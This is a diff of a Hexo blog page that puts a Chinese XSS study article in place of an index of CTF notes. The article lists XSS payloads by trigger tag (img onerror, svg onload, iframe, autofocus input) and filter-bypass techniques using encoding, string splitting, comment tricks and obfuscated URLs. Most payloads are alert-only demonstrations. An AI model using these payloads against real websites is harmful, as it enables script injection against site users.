@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            dyinglight's blog
+            XSS漏洞
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -32,187 +32,120 @@
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-title">Dyinglight</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
+                <h1 class="header-subtitle">XSS漏洞</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-07-12
+                        </span>
+                        
+                            
+                                <span id="/article/2088121029/" class="leancloud_visitors" data-flag-title="XSS漏洞">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2088121029/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
             
         </div>
     </div>
-    
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
     
 </div>
 <div id="container">
     
-        
-            <!-- 首页 -->
-            <div class="articles">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="XSS跨站脚本攻击漏洞"><a href="#XSS跨站脚本攻击漏洞" class="headerlink" title="XSS跨站脚本攻击漏洞"></a>XSS跨站脚本攻击漏洞</h1><h2 id="一、常见触发标签"><a href="#一、常见触发标签" class="headerlink" title="一、常见触发标签"></a>一、常见触发标签</h2><h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><h4 id="1"><a href="#1" class="headerlink" title="1.&lt;script&gt;"></a>1.&lt;script&gt;</h4><p><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2.&lt;img&gt;"></a>2.&lt;img&gt;</h4><p>当图片加载错误时触发</p>
+<p><code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</code></p>
+<p>还可以改成onmouseover&#x3D;”alert(1)”	onmouseout&#x3D;”alert(1)”</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3.&lt;a&gt;"></a>3.&lt;a&gt;</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.qq.com&quot;</span>&gt;</span>qq<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 不是触发性的动作需要加前缀javascript:</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:a&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4"><a href="#4" class="headerlink" title="4.&lt;input&gt;"></a>4.&lt;input&gt;</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5"><a href="#5" class="headerlink" title="5.&lt;from&gt;"></a>5.&lt;from&gt;</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>编码为base64</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<h4 id="6"><a href="#6" class="headerlink" title="6.&lt;iframe&gt;"></a>6.&lt;iframe&gt;</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="7"><a href="#7" class="headerlink" title="7.&lt;svg&gt;"></a>7.&lt;svg&gt;</h4><p><code>&lt;svg onload=alert(1)&gt;</code></p>
+<p>其他不常见的标签见</p>
+<h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><h4 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1.过滤空格"></a>1.过滤空格</h4><p>使用&#x2F;绕过</p>
+<p><code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);</code></p>
+<h4 id="2-过滤关键字"><a href="#2-过滤关键字" class="headerlink" title="2.过滤关键字"></a>2.过滤关键字</h4><p>（1）大小写绕过<br>（2）复写关键字<br>（3）字符拼接 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用eval</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line">使用top</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">``</span>xss<span class="string">``</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>(只有两个``这里是为了凸显出有`符号)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-其他字符混淆"><a href="#3-其他字符混淆" class="headerlink" title="3.其他字符混淆"></a>3.其他字符混淆</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(&quot;hello world!&quot;)&lt;/scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(``xss``);&quot;</span>&gt;</span> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-编码绕过"><a href="#4-编码绕过" class="headerlink" title="4.编码绕过"></a>4.编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">html编码<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line">Unicode编码绕过,eval里面也加分号</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line">url编码绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">Ascii码绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br><span class="line">Hex绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br><span class="line">八进制绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br><span class="line">base64绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-过滤双引号，单引号"><a href="#5-过滤双引号，单引号" class="headerlink" title="5.过滤双引号，单引号"></a>5.过滤双引号，单引号</h4><p>在js中，用两个反引号代替双引号</p>
+<p> 或者使用编码绕过</p>
+<h4 id="6-过滤括号"><a href="#6-过滤括号" class="headerlink" title="6.过滤括号"></a>6.过滤括号</h4><p>使用throw来绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-过滤url地址"><a href="#7-过滤url地址" class="headerlink" title="7.过滤url地址"></a>7.过滤url地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/ #url编码</span><br><span class="line">http://2130706433/ #十进制ip</span><br><span class="line">http://0177.0.0.01/ #8进制ip</span><br><span class="line">http://0x7f.0x0.0x0.0x1/ #16进制ip</span><br><span class="line">//www.baidu.com #html标签中用//可以代替http://</span><br></pre></td></tr></table></figure>
+
+<p>linux下可以使用\代替&#x2F;</p>
+<p>使用中文逗号代替英文逗号<br><code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</code></p>
+
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/1906377861/">[XYCTF]刷题笔记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-12
-                            </span>
-                            
-                                
-                                    <span id="/article/1906377861/" class="leancloud_visitors" data-flag-title="[XYCTF]刷题笔记">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1906377861/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Dyinglight
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/article/2088121029/" target="_blank">XSS漏洞</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>原神,启动！
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/1664270079/">upload-labs刷题笔记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-04
-                            </span>
-                            
-                                
-                                    <span id="/article/1664270079/" class="leancloud_visitors" data-flag-title="upload-labs刷题笔记">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1664270079/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/3998144523/">文件上传漏洞学习笔记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-03
-                            </span>
-                            
-                                
-                                    <span id="/article/3998144523/" class="leancloud_visitors" data-flag-title="文件上传漏洞学习笔记">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/3998144523/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/2093147683/">20240331刷题日记-sql</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-31
-                            </span>
-                            
-                                
-                                    <span id="/article/2093147683/" class="leancloud_visitors" data-flag-title="20240331刷题日记-sql">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2093147683/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/2623458554/">20240330刷题日记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-30
-                            </span>
-                            
-                                
-                                    <span id="/article/2623458554/" class="leancloud_visitors" data-flag-title="20240330刷题日记">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2623458554/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+                <div class="article-prev-next">
+                    
+                    
+                        <a href="/article/2082065426/" class="next-prefix">» </a> 下一篇：    <a href="/article/2082065426/" title="发布于 2024-07-06 01:59">php反序列化</a>
+                    
+                </div>
             </div>
             
-            
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
-
+    
+ 
+        </div>
     
 </div>
     <div id="footer">
@@ -244,7 +177,7 @@
             <div class="menu-list">
                 <ul>
                     
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                     
                         <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                     
